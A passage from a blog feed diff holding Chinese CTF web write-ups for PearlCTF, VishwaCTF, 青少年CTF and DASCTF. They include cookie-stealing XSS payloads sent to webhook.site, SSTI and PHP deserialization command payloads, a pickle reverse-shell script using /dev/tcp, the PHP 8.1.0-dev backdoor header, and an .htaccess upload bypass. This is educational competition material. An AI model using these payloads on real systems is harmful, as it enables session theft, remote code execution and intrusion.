+        childProcess.spawn('node', ['./bot.js', JSON.stringify({
+            url: to_req,
+            token: genToken()
+        })]);
+
+        return res.status(200).send(&quot;Admin will check!&quot;)
+    } catch (e) {
+        console.log(e)
+        return res.status(500).send(&quot;Internal Server Error&quot;)
+    }
+})
+</code></pre>
+<p>其中bot.js会用chromium对目标进行访问</p>
+<pre><code class="language-javascript">const puppeteer = require('puppeteer')
+
+async function visit(obj){
+	let browser;
+
+	let url = obj['url'];
+	let token = obj['token'];
+
+	if(!/^https?:\/\//.test(url)){
+		return;
+	}
+
+	try{
+		browser = await puppeteer.launch({
+            headless: true,
+            executablePath: '/usr/bin/chromium-browser',
+            args: [
+            '--no-sandbox',
+            '--headless',
+            '--disable-gpu',
+            '--disable-dev-shm-usage'
+            ]
+        });
+
+		let page = await browser.newPage();
+		await page.setCookie({
+			name: 'token',
+			value: token,
+			domain: 'localhost',
+			httpOnly: false,
+			secure: true,
+			sameSite: 'None'
+		});
+		await page.goto(url,{ waitUntil: 'domcontentloaded', timeout: 3000 });
+		await new Promise(r=&gt;setTimeout(r,10000));
+	}catch(e){ console.log(e) }
+	try{await browser.close();}catch(e){}
+	process.exit(0)
+}
+
+visit(JSON.parse(process.argv[2]))
+</code></pre>
+<p>这题要get flag需要一个<code>id=2</code>的jwt，来访问<code>/flag</code></p>
+<pre><code class="language-javascript">app.get(&quot;/flag&quot;, (req, res) =&gt; {
+    let token = req.cookies.token
+    try {
+        var decoded = jwt.verify(token, process.env.SECRET)
+        if (decoded.id != 2) {
+            return res.status(200).send(&quot;You are not verified&quot;)
+        }
+
+        return res.status(200).send(process.env.FLAG)
+    } catch {
+        return res.status(200).send(&quot;You are not verified&quot;)
+    }
+})
+</code></pre>
+<p>在对整个流程分析后可以知道，解题的方法只有拿到bot.js请求时用<code>genToken()</code>生成在cookie中的token，然后破解密钥伪造签名。</p>
+<h2 id="base">base</h2>
+<p>自定义的响应内容可以使用js，chromium也会正常加载js。所以让bot.js访问<code>/resp</code>获得的响应内容如下即可</p>
+<pre><code class="language-javascript">HTTP/1.1 200 OK
+Content-Type: text/html
+Content-Length: 121
+
+&lt;script&gt;
+fetch(`https://webhook.site/bd30b1b1-d95a-4010-a18f-5102e700c035/${document.cookie}`,{method: 'GET'});
+&lt;/script&gt;
+</code></pre>
+<p>Ps.这里有个要注意的点，bot.js在设置cookie时有个选项<code>secure: true</code>，它的意思是只允许cookie以https传输（拿自己vps用http试了好久都没注意到😭不过也因此知道了<code>webhook.site</code>这个平台👏）。</p>
+<p>编写脚本</p>
+<pre><code class="language-python">import requests
+
+def build(p):
+    return f&quot;HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: {len(p)}\r\n\r\n{p}&quot;
+
+webhook = &quot;https://webhook.site/bd30b1b1-d95a-4010-a18f-5102e700c035/&quot;
+body = f&quot;&quot;&quot;&lt;script&gt;
+fetch(`{webhook}${{document.cookie}}`,{{method: 'GET'}});
+&lt;/script&gt;&quot;&quot;&quot;
+
+payload = build(body)
+# print(payload)
+
+url = &quot;https://learn-http.ctf.pearlctf.in/check&quot;
+data = {&quot;body&quot;: payload}
+response = requests.post(url, data=data, headers={&quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;}, verify=False)
+print(response.text)
+</code></pre>
+<p>拿到token解密（要用密码本）、修改id、访问/flag</p>
+<pre><code class="language-shell">python jwt_tool.py &lt;jwt&gt; -C -d &lt;path&gt;
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/1710266513442.png" alt="" loading="lazy"></figure>
+<h2 id="better">better</h2>
+<p>这一难度修只改了<code>/resp</code>的逻辑</p>
+<pre><code class="language-go">body, ok := args[&quot;body&quot;]
+
+if !ok {
+    _, err = connection.Write([]byte(&quot;HTTP/1.1 200 OK\r\n\r\nGive me some body&quot;))
+    connection.Close()
+    return
+}
+
+splitted_resp := strings.Split(body[0], &quot;\r\n\r\n&quot;)
+// 在响应头顶部插入Content-Security-Policy: script-src 'self'
+new_header := strings.Join([]string{splitted_resp[0], &quot;Content-Security-Policy: script-src 'self'&quot;}, &quot;\r\n&quot;)
+
+final_body := strings.Join([]string{new_header, splitted_resp[1]}, &quot;\r\n\r\n&quot;)
+
+_, err = connection.Write([]byte(final_body))
+connection.Close()
+</code></pre>
+<p>按理来说，CSP只限制了内容的加载是同源的，对于一个响应中的js代码不影响才对。比如下面这个代码，即使加了CSP，但script中的代码依然会执行，请求还是会发送出去。</p>
+<pre><code class="language-php">&lt;?php
+    if (!isset($_COOKIE['skky'])) {
+        setcookie('skky',md5(rand(0,1000)));
+    }
+    header(&quot;Content-Security-Policy: script-src 'self';&quot;);
+?&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;CSP Test&lt;/title&gt;
+    &lt;script&gt;
+      fetch(`https://webhook.site/bd30b1b1-d95a-4010-a18f-5102e700c035/${document.cookie}`, {method: 'GET'});
+    &lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;h2&gt;CSP-safe&lt;/h2&gt;
+&lt;/body&gt;
+
+</code></pre>
+<p>但这里可能是不同浏览器对CSP策略不同，在使用bot.js的chromium访问的时候，这个webhook的请求是发不出去的。虽然把原因推到浏览器上感觉怪怪的，不过这里我也找不到更合适的解释了。</p>
+<pre><code class="language-python">import subprocess
+import requests
+
+
+def run_command(cmd):
+    result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+    if result.stderr:
+        return f&quot;Error: {result.stderr}&quot;
+    else:
+        return result.stdout
+
+
+# 使用题目的docker进行测试
+url = &quot;http://172.22.107.50:8888/xss/&quot;
+command = ['docker', 'run', '--rm', '--net=host', 'xss_bot', '/usr/local/bin/node', '/home/app/bot.js', f'{{&quot;url&quot;:&quot;{url}&quot;, &quot;token&quot;:&quot;skky&quot;}}']
+output = run_command(command)
+print(output)
+</code></pre>
+<p>Anyway，既然要同源加载一个脚本的话，那我们就可以利用它内部的<code>http://localhost:5001/resp</code>来做。首先让bot.js访问得到类似下面的内容</p>
+<pre><code class="language-javascript">HTTP/1.1 200 OK
+Content-Type: text/html
+Content-Length: 60
+
+&lt;script src=&quot;http://localhost:5001/resp?body=xxxx&quot;&gt;&lt;/script&gt;
+</code></pre>
+<p>这里的<code>src</code>引入的脚本就是同源的。接着构造这个url的body部分，在它的响应中执行js代码</p>
+<pre><code class="language-javascript">HTTP/1.1 200 OK
+Content-Type: text/html
+Content-Length: 102
+
+fetch(`https://webhook.site/bd30b1b1-d95a-4010-a18f-5102e700c035/${document.cookie}`,{method: 'GET'});
+</code></pre>
+<p>利用脚本如下</p>
+<pre><code class="language-javascript">import urllib.parse
+import requests
+
+
+def build(p):
+    return f&quot;HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: {len(p)}\r\n\r\n{p}&quot;
+
+
+webhook = &quot;https://webhook.site/bd30b1b1-d95a-4010-a18f-5102e700c035/&quot;
+body_2 = f&quot;&quot;&quot;fetch(`{webhook}${{document.cookie}}`,{{method: 'GET'}});&quot;&quot;&quot;
+# print(build(body_2))
+src = f&quot;http://localhost:5001/resp?body={urllib.parse.quote(build(body_2))}&quot;
+
+body_1 = f&quot;&lt;script src=\&quot;{src}\&quot;&gt;&lt;/script&gt;&quot;
+payload = build(body_1)
+# print(payload)
+
+url = &quot;https://v1-learn-http.ctf.pearlctf.in/check&quot;
+data = {&quot;body&quot;: payload}
+response = requests.post(url, data=data, headers={&quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;}, verify=False)
+print(response.text)
+</code></pre>
+<h2 id="final">final</h2>
+<p>最后难度首先修改了响应逻辑，去除了响应体中所有的尖括号<code>&lt;``&gt;</code>。</p>
+<pre><code class="language-go">body, ok := args[&quot;body&quot;]
+
+if !ok {
+    _, err = connection.Write([]byte(&quot;HTTP/1.1 200 OK\r\n\r\nGive me some body&quot;))
+    connection.Close()
+    return
+}
+
+splitted_resp := strings.Split(body[0], &quot;\r\n\r\n&quot;)
+
+sanitized_body := strings.Replace(splitted_resp[1], &quot;&lt;&quot;, &quot;&quot;, -1)
+sanitized_body = strings.Replace(sanitized_body, &quot;&gt;&quot;, &quot;&quot;, -1)
+
+final := strings.Join([]string{splitted_resp[0], sanitized_body}, &quot;\r\n\r\n&quot;)
+
+_, err = connection.Write([]byte(final))
+connection.Close()
+</code></pre>
+<p>同时修改了nodejs的路由</p>
+<pre><code class="language-javascript">app.get(&quot;/&quot;, (req, res) =&gt; {
+    res.sendFile(path.join(__dirname, &quot;templates/index.html&quot;))
+})
+
+app.get(&quot;/learn&quot;, (req, res) =&gt; {
+    res.status(200).sendFile(path.join(__dirname, &quot;templates/learn.html&quot;))
+})
+</code></pre>
+<p>现在虽然无法在<code>/resp</code>中执行js了，但新增的路由<code>/learn</code>存在XSS漏洞</p>
+<pre><code class="language-javascript">function getCookie(name) {
+    var nameEQ = name + &quot;=&quot;;
+    var ca = document.cookie.split(';');
+    for(var i=0;i &lt; ca.length;i++) {
+        var c = ca[i];
+        while (c.charAt(0)==' ') c = c.substring(1,c.length);
+        if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
+    }
+    return null;
+}
+
+document.getElementById(&quot;greet&quot;).innerHTML = `Hello, ${getCookie(&quot;name&quot;)}`
+</code></pre>
+<p><code>templates/learn.html</code>会获取请求中cookie，并且未做任何处理输出在页面上。因为这部分的代码是在页面加载后执行的，所以cookie如果设置为类似<code>&lt;script&gt;alert&lt;/script&gt;</code>并不会执行。<br>
+<img src="https://skyblu3519.github.io/post-images/1710266528322.png" alt="" loading="lazy"></p>
+<p>可以用<code>img</code>标签的<code>onerror</code>事件触发，类似<code>&lt;img src=x onerror=&quot;alert(1)&quot;&gt;</code>。</p>
+<p>对于bot.js，虽然无法让它直接访问<code>/learn</code>，但是可以让<code>/resp</code>返回一个302跳转</p>
+<pre><code class="language-javascript">HTTP/1.1 302 Found
+Location: http://localhost:5000/learn
+Set-Cookie: name=&lt;img src=x onerror=&quot;fetch('https://webhook.site/bd30b1b1-d95a-4010-a18f-5102e700c035/'+document.cookie)&quot;/&gt;
+Content-Length: 0
+</code></pre>
+<p>利用脚本</p>
+<pre><code class="language-python">import urllib.parse
+import requests
+
+
+def build(p):
+    webhook = &quot;https://webhook.site/bd30b1b1-d95a-4010-a18f-5102e700c035/&quot;
+    onerror = f&quot;fetch('{webhook}'+document.cookie)&quot;
+    cookie = f&quot;&lt;img src=x onerror=\&quot;{onerror}\&quot;/&gt;&quot;
+    return f&quot;HTTP/1.1 302 Found\r\nLocation: http://localhost:5000/learn\r\nSet-Cookie: name={cookie}\r\nContent-Length: {len(p)}\r\n\r\n{p}&quot;
+
+
+payload = build('')
+# print(payload)
+
+data = {&quot;body&quot;: payload}
+url = &quot;https://v2-learn-http.ctf.pearlctf.in/check&quot;
+response = requests.post(url, data=data, headers={&quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;}, verify=False)
+print(response.text)
+</code></pre>
+<h1 id="i-am-a-web-noob">I am a web-noob</h1>
+<p>user处存在ssti</p>
+<p>过滤了双花括号（{{）、中括号（[）、下划线（_）、一些字符串（&quot;open&quot;、&quot;-&quot;......）</p>
+<p>使用控制语句<code>{% print() %}</code>执行+输出结果，<code>|attr(request.args.a)</code>访问对象属性。</p>
+<p>构造payload获取可以用的类，这个执行结果等价于：<code>''.__class__.__base__.__subclasses__()[154]</code></p>
+<pre><code>?user={%print(&quot;&quot;|attr(request.args.a)|attr(request.args.b)|attr(request.args.c)()|attr(request.args.d)(154))%}&amp;a=__class__&amp;b=__base__&amp;c=__subclasses__&amp;d=__getitem__
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://skyblu3519.github.io/post-images/1710266546021.png" alt="" loading="lazy"></figure>
+<p>使用popen执行命令读取flag，这里要注意一个括号的位置，相当于<code>(os.popen(cmd)).read()</code></p>
+<pre><code>?user={%print((&quot;&quot;|attr(request.args.a)|attr(request.args.b)|attr(request.args.c)()|attr(request.args.d)(154)|attr(request.args.e)|attr(request.args.f)|attr(request.args.d)(request.args.g)(request.args.rce)).read())%}&amp;a=__class__&amp;b=__base__&amp;c=__subclasses__&amp;d=__getitem__&amp;e=__init__&amp;f=__globals__&amp;g=popen&amp;rce=cat /app/flag.txt
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://skyblu3519.github.io/post-images/1710266559310.png" alt="" loading="lazy"></figure>
+<h1 id="rabbithole">rabbithole</h1>
+<p>🐰<br>
+<img src="https://skyblu3519.github.io/post-images/1710266614161.png" alt="" loading="lazy"><br>
+<img src="https://skyblu3519.github.io/post-images/1710266619923.png" alt="" loading="lazy"><br>
+<img src="https://skyblu3519.github.io/post-images/1710266624772.png" alt="" loading="lazy"></p>
+<h1 id="uploader">uploader</h1>
+<p>文件上传对内容做了详细的检查，但是后缀名并没有。</p>
+<p>上传base64编码后的php命令执行代码<br>
+<img src="https://skyblu3519.github.io/post-images/1710266655041.png" alt="" loading="lazy"></p>
+<p>上传<code>.htaccess</code>，使用<code>\</code>+换行绕过内容检查（如果愿意可以在每一个字符后都加上，这样依然可以解析），上传的<code>.htaccess</code>内容为：</p>
+<pre><code># 开启PHP解析引擎
+php_flag engine on
+# 需要绝对路径，因为inclulde的当前路径为/usr/local/lib/php
+php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=/var/www/html/uploads/10.80.1.9/26398c9deb8c36cb3de78baec7da7f4f1be1438aad2876be79d21e9592d9aea3.php&quot;
+</code></pre>
+<p><img src="https://skyblu3519.github.io/post-images/1710266664944.png" alt="" loading="lazy"><br>
+<img src="https://skyblu3519.github.io/post-images/1710266733221.png" alt="" loading="lazy"><br>
+访问上传的php文件，使用命令查找flag.txt<br>
+<img src="https://skyblu3519.github.io/post-images/1710266697043.png" alt="" loading="lazy"></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[vishwactf2024]WEB WP]]></title>
+        <id>https://skyblu3519.github.io/post/vishwactf2024web-wp/</id>
+        <link href="https://skyblu3519.github.io/post/vishwactf2024web-wp/">
+        </link>
+        <updated>2024-03-03T12:43:00.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="save-the-city">Save The City</h1>
+<p>CVE-2018-10993，参考：<a href="https://gist.github.com/mgeeky/a7271536b1d815acfb8060fd8b65bd5d">https://gist.github.com/mgeeky/a7271536b1d815acfb8060fd8b65bd5d</a></p>
+<p>执行命令读/location.txt文件<br>
+<img src="https://skyblu3519.github.io/post-images/1709484866433.png" alt="" loading="lazy"></p>
+<p>flag:VishwaCTF{elrow-club-pune}</p>
+<h1 id="recipe-archival-workshop">Recipe Archival Workshop</h1>
+<p>太蠢了这题。</p>
+<p>上传文件后缀改为tiff得到flag<br>
+<img src="https://skyblu3519.github.io/post-images/1709484875674.png" alt="" loading="lazy"></p>
+<p>扫描目录有个cron.sh，里面执行了<code>find uploads/ -type f -cmin +5 -exec rm {} \;</code>。但确实没有任何利用的可能。<br>
+<img src="https://skyblu3519.github.io/post-images/1709484893671.png" alt="" loading="lazy"></p>
+<h1 id="trip-to-us">trip to us</h1>
+<p>dirsearch，发现db<br>
+<img src="https://skyblu3519.github.io/post-images/1709484901388.png" alt="" loading="lazy"></p>
+<p>里面有admin的密码(admin/unbre@k@BLE_24)<br>
+<img src="https://skyblu3519.github.io/post-images/1709484930323.png" alt="" loading="lazy"></p>
+<p>进入/auth-iit-user.php登录admin<br>
+<img src="https://skyblu3519.github.io/post-images/1709484937339.png" alt="" loading="lazy"></p>
+<h1 id="they-are-coming">They Are Coming</h1>
+<p>robots.txt得到Decryption key: th1s_1s_n0t_t5e_f1a9。L3NlY3JldC1sb2NhdGlvbg== 可以base64 -&gt; /secret-location，去/secret-location可以找到local storage有東西<br>
+<img src="https://skyblu3519.github.io/post-images/1709484960638.png" alt="" loading="lazy"></p>
+<p>页面提示加密方式为AES-CBC-128，在线工具解<br>
+<img src="https://skyblu3519.github.io/post-images/1709484967926.png" alt="" loading="lazy"></p>
+<h1 id="medicare-pharma">MediCare Pharma</h1>
+<p>过滤了数字，<code>username=asd&amp;password=asd' or 'a'='a'#</code>得到密码(medicare/5trongp455!)<br>
+<img src="https://skyblu3519.github.io/post-images/1709484974488.png" alt="" loading="lazy"></p>
+<p>进入系统，勾选全部商品点击Buy All可以下载源码<br>
+<img src="https://skyblu3519.github.io/post-images/1709485081075.png" alt="" loading="lazy"></p>
+<p>PS.在js里面也可以找到源码（images/pharmacy.txt）<br>
+<img src="https://skyblu3519.github.io/post-images/1709485086332.png" alt="" loading="lazy"></p>
+<pre><code class="language-php">&lt;?php
+header('Content-Type: application/json');
+
+if ($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;) 
+{
+    $enteredInput = $_POST['search_param'];
+    
+    if (strlen($enteredInput) == 0)
+    {
+        echo json_encode(['result' =&gt; &quot;Search bar cannot be empty&quot;]);
+    }
+
+    else
+    {
+        $result = shell_exec($enteredInput);
+
+        if ($result == null)
+        {
+            echo json_encode(['result' =&gt; ($enteredInput . &quot; not found in store&quot;)]);
+        }
+
+        else
+        {
+            echo json_encode(['result' =&gt; $result]);
+        }
+    }
+
+} 
+
+else 
+{
+    http_response_code(404);
+    echo json_encode(['error' =&gt; 'Access Forbidden']);
+}
+?&gt;
+</code></pre>
+<p>search_param参数是一个后门，执行命令找flag<br>
+<img src="https://skyblu3519.github.io/post-images/1709485106113.png" alt="" loading="lazy"><br>
+<img src="https://skyblu3519.github.io/post-images/1709485114732.png" alt="" loading="lazy"></p>
+<h1 id="prompt-injection">prompt injection</h1>
+<p>原题：<a href="https://squ1rrel.dev/sekai-bottle">https://squ1rrel.dev/sekai-bottle</a></p>
+<ul>
+<li>/show?id=../../proc/self/cmdline任意文件读取进程启动命令</li>
+<li>/show?id=../../../app/app.py读取源码</li>
+<li>/show?id=../../app/config/secret.py读取密钥Vishwa</li>
+<li>bottle request.get_cookie RCE，编写利用脚本</li>
+<li>用脚本计算的payload替换cookie中name的value</li>
+<li>反弹shell，执行/flag，getflag</li>
+</ul>
+<p><img src="https://skyblu3519.github.io/post-images/1709485146725.png" alt="" loading="lazy"><br>
+计算payload脚本：</p>
+<pre><code class="language-python">import hashlib
+import os
+import pickle
+import base64
+import hmac
+
+Vishwa = &quot;trrrrrrrrrrrrryyyyyyyyyyyharddddddddd&quot;
+remote_ip = &quot;remote_ip&quot;
+def tob(s, enc='utf8'):
+    return s.encode(enc) if isinstance(s, str) else bytes(s)
+class A(object):
+    def __reduce__(self):
+        s = f&quot;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/{remote_ip}/9999 0&gt;&amp;1\&quot;&quot;
+        return (os.system, (s,))
+
+a = A()
+s = pickle.dumps(a)
+msg = base64.b64encode(s)
+sig = base64.b64encode(hmac.new(tob(Vishwa), msg, digestmod=hashlib.md5).digest())
+
+payload = tob('!') + sig + tob('?') + msg
+print(payload)
+</code></pre>
+<p>下面简单看下<code>get_cookie</code>中反序列化漏洞产生的原因。从cookie中获取的值直接传入<code>cookie_decode</code><br>
+<img src="https://skyblu3519.github.io/post-images/1709485196140.png" alt="" loading="lazy"></p>
+<p>这里就有熟悉的<code>pickle.loads</code><br>
+<img src="https://skyblu3519.github.io/post-images/1709485201955.png" alt="" loading="lazy"></p>
+<p>bottle中cookie的格式为:</p>
+<pre><code class="language-python">![sig]?[msg]
+</code></pre>
+<p><code>_lscmp</code>是一个bottle实现的字符串安全比较的函数，验证的方式为</p>
+<pre><code class="language-python">_lscmp(sig[1:], base64.b64encode(hmac.new(tob(key), msg, digestmod=hashlib.md5).digest()))
+</code></pre>
+<p>通过之后pickle.loads便会对msg反序列化。</p>
+<h1 id="h34d3rs">H34D3RS</h1>
+<p>http 请求头伪造</p>
+<pre><code>User-Agent: lorbrowser
+Referer: https://vishwactf.com/
+Date: 2024
+Upgrade-Insecure-Requests: 10
+Downlink: 999999999
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[青少年CTF]WEB WP]]></title>
+        <id>https://skyblu3519.github.io/post/qing-shao-nian-ctfweb-wp/</id>
+        <link href="https://skyblu3519.github.io/post/qing-shao-nian-ctfweb-wp/">
+        </link>
+        <updated>2024-03-01T16:14:58.000Z</updated>
+        <content type="html"><![CDATA[<blockquote>
+<p>水</p>
+</blockquote>
+<p>老毕登CTF</p>
+<h1 id="php的后门"><strong>PHP的后门</strong></h1>
+<p>页面提示了PHP版本</p>
+<pre><code class="language-java">X-Powered-By: PHP/8.1.0-dev
+</code></pre>
+<p>搜搜<br>
+<img src="https://skyblu3519.github.io/post-images/1709309806631.png" alt="" loading="lazy"></p>
+<p>请求头加上</p>
+<pre><code class="language-java">User-Agentt:zerodiumsystem(&quot;cat /flag&quot;);
+</code></pre>
+<p>getflag<br>
+<img src="https://skyblu3519.github.io/post-images/1709309814971.png" alt="" loading="lazy"></p>
+<h1 id="easymd5">EasyMD5</h1>
+<p>进去是一个PDF文件上传点，简单测试下发现提示MD5碰撞<br>
+<img src="https://skyblu3519.github.io/post-images/1709309821637.png" alt="" loading="lazy"></p>
+<p>使用工具fastcoll生产两个内容不同但MD5相同的pdf文件<br>
+<img src="https://skyblu3519.github.io/post-images/1709309842389.png" alt="" loading="lazy"></p>
+<p>PS.工具下载链接：<a href="http://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip">http://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip</a></p>
+<p>上传getflag<br>
+<img src="https://skyblu3519.github.io/post-images/1709309848469.png" alt="" loading="lazy"></p>
+<h1 id="php的xxe">PHP的XXE</h1>
+<p>目录扫描到<code>/dom.php</code>，是一个解析xml文档的应用。用外部实体读flag文件即可<br>
+<img src="https://skyblu3519.github.io/post-images/1709309869702.png" alt="" loading="lazy"></p>
+<h1 id="easy_sqli"><strong>Easy_SQLi</strong></h1>
+<p>布尔盲注，没有过滤。直接上SQLMap就行<br>
+<img src="https://skyblu3519.github.io/post-images/1709309875990.png" alt="" loading="lazy"></p>
+<h1 id="雏形系统">雏形系统</h1>
+<p>扫到/www.zip，拿到/index.php的源码。做了代码混淆，直接echo eval的参数即可。最后看到代码执行的逻辑</p>
+<pre><code class="language-php">&lt;?php
+error_reporting(0);
+
+class shi
+{
+    public $next;
+    public $pass;
+    public function __toString(){
+        $this-&gt;next::PLZ($this-&gt;pass);
+    }
+}
+class wo
+{
+    public $sex;
+    public $age;
+    public $intention;
+    public function __destruct(){
+        echo &quot;Hi Try serialize Me!&quot;;
+        $this-&gt;inspect();
+    }
+    function inspect(){
+        if($this-&gt;sex=='boy'&amp;&amp;$this-&gt;age=='eighteen')
+        {
+            echo $this-&gt;intention;
+        }
+        echo &quot;🙅18岁🈲&quot;;
+    }
+}
+
+class Demo
+{
+    public $a;
+    static function __callStatic($action, $do)
+    {
+        global $b;
+        $b($do[0]);
+    }
+}
+
+$b = $_POST['password'];
+$a = $_POST['username'];
+@unserialize($a);
+if (!isset($b)) {
+    echo &quot;==================PLZ Input Your Name!==================&quot;;
+}
+if($a=='admin'&amp;&amp;$b==&quot;'k1fuhu's test demo&quot;)
+{
+    echo(&quot;登录成功&quot;);
+}
+
+?&gt;
+</code></pre>
+<p>构造链的入口从<code>wo#__destruct</code>进入，<code>inspect()</code>中的echo到<code>shi#__toString</code>，最后到<code>Demo</code>通过可变函数执行命令，其中<code>$_POST['password']</code>是函数名称<code>shi.pass</code>为传入参数。pop链构造</p>
+<pre><code class="language-php">&lt;?php
+class shi
+{
+
+    public function __construct() {
+        $this-&gt;next = new Demo;
+        $this-&gt;pass = &quot;cat /flag&quot;;
+    }
+}
+class wo
+{
+    public $sex='boy';
+    public $age='eighteen';
+    public function __construct() {
+        $this-&gt;intention = new shi;
+    }
+}
+
+class Demo
+{
+}
+
+$o = serialize(new wo);
+echo $o;
+?&gt;
+</code></pre>
+<p>payload为</p>
+<pre><code>password=system&amp;username=O:2:&quot;wo&quot;:3:{s:3:&quot;sex&quot;;s:3:&quot;boy&quot;;s:3:&quot;age&quot;;s:8:&quot;eighteen&quot;;s:9:&quot;intention&quot;;O:3:&quot;shi&quot;:2:{s:4:&quot;next&quot;;O:4:&quot;Demo&quot;:0:{}s:4:&quot;pass&quot;;s:9:&quot;cat /flag&quot;;}}
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[DASCTF_X_CBCTF2023]bypassJava]]></title>
+        <id>https://skyblu3519.github.io/post/dasctf_x_cbctf2023bypassjava/</id>
+        <link href="https://skyblu3519.github.io/post/dasctf_x_cbctf2023bypassjava/">
+        </link>
+        <updated>2024-03-01T03:39:59.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="题目环境">题目环境</h1>
+<p>官方WP：<a href="https://pankas.top/2023/10/22/dasctfxcbctf-2023-bypassjava-wp/">https://pankas.top/2023/10/22/dasctfxcbctf-2023-bypassjava-wp/</a><br>
+环境详情：<a href="https://github.com/pankass/DASCTF_X_CBCTF2023_bypassJava">https://github.com/pankass/DASCTF_X_CBCTF2023_bypassJava</a></p>
+<h1 id="解题流程">解题流程</h1>
+<p>Controller很简单，<code>/read</code>有个反序列化利用点<br>
+<img src="https://skyblu3519.github.io/post-images/1709264488562.png" alt="" loading="lazy"></p>
+<p>但是Filter中对ContentLength做了长度限制，这个1145这个长度显然是打不了任何payload的。<br>
+<img src="https://skyblu3519.github.io/post-images/1709264512228.png" alt="" loading="lazy"></p>
+<p>深入调试，分析<code>getContentLength()</code>获取请求体长度的逻辑。<code>servletRequest.getContentLength()</code>直接返回了<code>Request.contentLength</code>这个属性。<br>
+<img src="https://skyblu3519.github.io/post-images/1709264521012.png" alt="" loading="lazy"></p>
+<p>追踪这个属性。在<code>org.apache.coyote.http11.Http11Processor#prepareInputFilters</code>方法进行的赋值<br>
+<img src="https://skyblu3519.github.io/post-images/1709264550106.png" alt="" loading="lazy"></p>
+<p><code>getContentLengthLong</code>方法直接获取header中的content-length字段为<code>contentLength</code>赋值<br>
+<img src="https://skyblu3519.github.io/post-images/1709264559191.png" alt="" loading="lazy"></p>
+<p>而在<code>contentLength</code>赋值后的代码中，如果<code>contentDelimitation</code>被设置为True，<code>contentLength</code>会被修改为-1。<br>
+<img src="https://skyblu3519.github.io/post-images/1709264567213.png" alt="" loading="lazy"></p>
+<p>通过对<code>contentDelimitation</code>的追踪，可以发现它是表示报文有没有进行分块传输的<br>
+<img src="https://skyblu3519.github.io/post-images/1709264590375.png" alt="" loading="lazy"></p>
+<p>如果transfer-encoding是chunked，那么<code>contentDelimitation</code>就会被修改为True<br>
+<img src="https://skyblu3519.github.io/post-images/1709264598200.png" alt="" loading="lazy"></p>
+<p>所以可以通过<code>Transfer-Encoding: chunked</code>绕过filter中的长度限制（BP插件），然后打个SpringBoot内存马。<br>
+<img src="https://skyblu3519.github.io/post-images/1709264607089.png" alt="" loading="lazy"></p>
+<p>然后发现存在RASP，forkAndExec被hook了。<br>
+<img src="https://skyblu3519.github.io/post-images/1709264620663.png" alt="" loading="lazy"></p>
+<p>虽然执行不了命令，但可以用<code>java.nio.file</code>对文件进行读取。重新注册一个读文件的Controller</p>
+<pre><code class="language-java">public void fileAccess(HttpServletRequest req, HttpServletResponse res) throws Exception {
+    String filedir = req.getParameter(&quot;filedir&quot;);
+    String filename = req.getParameter(&quot;filename&quot;);
+
+    if (filedir != null) {
+        PrintWriter out = res.getWriter();
+        File dir = new File(filedir);
+        if (dir.exists() &amp;&amp; dir.isDirectory()) {
+            File[] files = dir.listFiles();
+            if (files != null) {
+                Arrays.stream(files).forEach(file -&gt; out.println(file.getName()));
+            } else {
+                out.println(&quot;No files found in the directory.&quot;);
+            }
+        } else {
+            out.println(&quot;Directory does not exist or is not a directory.&quot;);
+        }
+    } else if (filename != null) {
+        File file = new File(filename);
+        if (file.exists() &amp;&amp; file.isFile()) {
+            // 使用 FileInputStream 读取文件
+            try (FileInputStream in = new FileInputStream(file)) {
+                byte[] buffer = new byte[1024];
+                int bytesRead;
+                while ((bytesRead = in.read(buffer)) != -1) {
+                    res.getOutputStream().write(buffer, 0, bytesRead);
+                }
+            } catch (IOException e) {
+                res.getWriter().println(&quot;Error reading file: &quot; + e.getMessage());
+            }
+        } else {
+            res.getWriter().println(&quot;File does not exist or is not a file.&quot;);
+        }
+    } else {
+        res.getWriter().println(&quot;Please provide a valid 'filedir' or 'filename' parameter.&quot;);
+    }
+
+}
+</code></pre>
+<p>filedir参数读取目录结构，filename参数读取文件内容。然后接可以发现/home/ctf目录下的RASP程序simpleRASP.jar<br>
+<img src="https://skyblu3519.github.io/post-images/1709264646865.png" alt="" loading="lazy"></p>
+<p><code>?filename=/home/ctf/simpleRASP.jar</code>读取下来后开始审计。<br>
+<img src="https://skyblu3519.github.io/post-images/1709264653194.png" alt="" loading="lazy"></p>
+<p>这个程序是为一个运行的JVM添加一个代理。Main会把MyAgent打入SpringBoot中，然后执行MyAgent的agentmain方法。<br>
+<img src="https://skyblu3519.github.io/post-images/1709264660091.png" alt="" loading="lazy"></p>
+<p>这段代码做了两件事：</p>
+<ol>
+<li>添加了一个ClassFileTransformer，名字是MyAgentTransformer</li>
+<li>如果java.lang.UNIXProcess和java.lang.ClassLoader已经加载，则用MyAgentTransformer重新定义 Class。</li>
+</ol>
+<p>MyAgentTransformer对这两个类执行了不同的的transformed方法<br>
+<img src="https://skyblu3519.github.io/post-images/1709264703222.png" alt="" loading="lazy"></p>
